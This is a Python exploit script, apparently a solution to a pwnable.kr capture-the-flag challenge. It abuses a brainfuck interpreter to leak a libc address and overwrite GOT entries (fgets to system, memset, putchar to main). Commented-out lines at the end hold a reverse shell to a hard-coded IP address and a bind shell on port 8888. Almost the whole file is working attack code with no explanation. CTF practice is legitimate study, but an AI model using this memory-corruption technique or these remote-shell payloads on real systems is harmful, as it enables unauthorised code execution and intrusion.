import socket, struct, os


# Build Payload

# move pointer to got.plt fgets
payload = "<"*(0x0804a0a0 - 0x0804a010)
# read fgets address
payload += ".>"*4 
# move pointer back to got.plt fgets
payload += "<"*4
# write system() to fgets
payload += ",>"*4 
# move pointer to got.plt memset
payload += ">"*((0x0804a02c-0x0804a010)-4)
# write memset to fgets address
payload += ",>"*4
# move to putchar() but already here
# write pointer to main() -0x08048671 
payload += ",>"*4
# call putchar which is now main
payload += "."
payload += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9001))


data = ''
while "type" not in data:
	data = s.recv(1024)
	print data


# send payload
print '[*] sending payload'
s.send(payload)

fgets_address = s.recv(512)
while len(fgets_address) < 4:
	fgets_address += s.recv(512)


fgets_address = struct.unpack("<I", fgets_address)[0]
print '[*] fgets address = 0x%08x' % fgets_address


# from libc.so.6
system_offset = 0x00041490
fgets_offset = 0x069df0
system_address = fgets_address - (fgets_offset - system_offset)
print "[*] system at 0x%08x" % system_address

print '[*] overwriting got.plt fget() address with system() address'
s.send(struct.pack("<I", system_address))


print '[*] overwriting got.plt memset with fgets address'
s.send(struct.pack("<I", fgets_address))

print '[*] overwriting got.plt putchar with main()-0x08048671'
s.send(struct.pack("<I", 0x08048671))

data = ''
if "type" not in data:
	data = s.recv(512)
	print data


#ip_address = "127.0.0.1"
#ip_address = "192.168.0.161"
ip_address = "70.77.162.3"
#s.send("/bin/sh -c \'python -c \'import subprocess, socket, os; "\
#	"s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "\
#	"s.connect((\"" + ip_address + "\", 1337));"\
#	"os.dup2(s.fileno(), 0), os.dup2(s.fileno(), 1), os.dup2(s.fileno(), 2);"\
#	"p = subprocess.call([\"/bin/sh\", \"-i\"]);\'\'\r\n")

#s.send("import subprocess, socket, os;"\
#   	"s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "\
#     	"s.bind((\'\', 8888)); "\
#      	"s.listen(1);"
#        "conn,addr = s.accept()"\
#	"os.dup2(conn.fileno(), 0), os.dup2(conn.fileno(), 1), os.dup2(conn.fileno(), 2); "\
#	"p = subprocess.call([\"/bin/sh\", \"-i\"]);")

#while(True):
#	s.send(raw_input())
#	print s.recv(2048)



